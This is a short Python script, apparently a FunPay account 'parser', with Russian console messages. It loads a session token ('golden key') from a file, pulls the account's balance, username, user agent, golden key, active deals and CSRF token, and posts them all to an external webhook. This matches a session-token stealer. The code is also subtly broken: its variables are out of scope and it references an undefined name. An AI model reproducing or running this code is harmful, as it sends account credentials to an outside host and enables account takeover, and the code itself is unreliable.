import requests, FunPayAPI
from FunPayAPI import Account, types, enums, Runner

filenamew = "webhook.txt"

with open(filenamew, "r") as file:
    webhookurl = file.read().strip()

filenameg = "goldenkey.txt"

with open(filenameg, "r") as file:
    token = file.read().strip()

def parser():
    
    def parsbalance():
        print ("Парс баланса...")
        global acc
        acc = Account(token).get()
        balance = acc.get_balance()
        print (f"Баланс аккаунта = {balance}")
    parsbalance()
    
    def parsusername():
        print ("Парс никнейма...")
        username = acc.username
        print (f"Никнейм = {username}")
        
    parsusername()

    def parsuseragent():
        print ("Парс user_agent`a...")
        user_agent = acc.user_agent
        print (f"user_agent = {user_agent}")
        
    parsuseragent()
    
    def parsgoldenkey():
        print ("Парс golden key...")
        goldkey = acc.golden.key
        print (f"golden key аккаунта = {goldkey}")
        
    parsgoldenkey()
    
    def parssalespurchases():
        print ("Парс списка активных покупок и продаж...")
        aplist = acc.active_sales
        print (f"Активные продажи: {aplist}")
        aplist1 = acc.active_purchases
        print (f"Активные покупки: {aplist1}")
    
    parssalespurchases()
    
    def parscsrf():
        print ("Парс CSRF токена...")
        csrf = acc.csrf_token
        print (f"CSRF токен = {csrf}")
    
    parscsrf()
    
    def webhook():
        WEBHOOK_URL = f"{webhookurl}"
        
        def send_message_no_output(content):
            data = {
                "content": content,
                "allowed_mentions": {"parse": []}
            }
            requests.post(WEBHOOK_URL, json=data)
        
        send_message_no_output(f"Баланс аккаунта: {balance}\nНикнейм: {username}\nUSER_AGENT браузера: {user_agent}\ngolden_key аккаунта: {goldkey}\nСписок активных покупок аккаунт: {aplist1}\nСписок активных продаж аккаунта: {aplist}\n CSRF токен: {csrf}")    
        
        send_message_no_output(content)
    webhook()
parser()
    
    
        

        
